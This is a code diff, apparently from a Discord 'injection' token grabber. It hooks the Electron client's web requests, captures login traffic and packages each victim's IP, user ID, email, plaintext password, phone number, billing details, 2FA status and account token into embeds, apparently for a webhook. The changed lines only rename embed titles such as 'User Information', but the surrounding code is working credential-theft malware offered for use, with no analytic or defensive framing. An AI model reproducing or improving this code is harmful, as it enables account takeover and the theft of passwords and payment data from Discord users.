@@ -62,7 +62,7 @@ const makeEmbed = async ({
         username: "AdB2GD31sf2SF76",
         content: "",
         embeds: [{
-            title: "dsa",
+            title: "Discord was opened",
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
@@ -222,7 +222,8 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`);
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`);
         var params = await makeEmbed({
-            title: `\`${user.username}\``,
+            name: `\`${user.username}\``,
+            title: "User Information",
             fields: [
                 { name: "IP", value: `\`${ip}\``, inline: false },
                 { name: "ID", value: `\`${user.id}\``, inline: false },
@@ -342,7 +343,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: `\`${user.username}\``,
+                name: `\`${user.username}\``,
+                title: "User Information",
                 fields: [
                     { name: "IP", value: `\`${ip}\``, inline: false },
                     { name: "ID", value: `\`${user.id}\``, inline: false },
@@ -351,7 +353,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
                     { name: "Billing", value: `${Billings}`, inline: false },
                     { name: "Email", value: `\`${user.email}\``, inline: false },
-                    { name: "Password", value: `\`${password}\``, inline: false},
+                    { name: "Password", value: `\`${password}\``, inline: false },
                     { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
                     { name: "Token", value: `\`${token}\``, inline: false }
                 ],
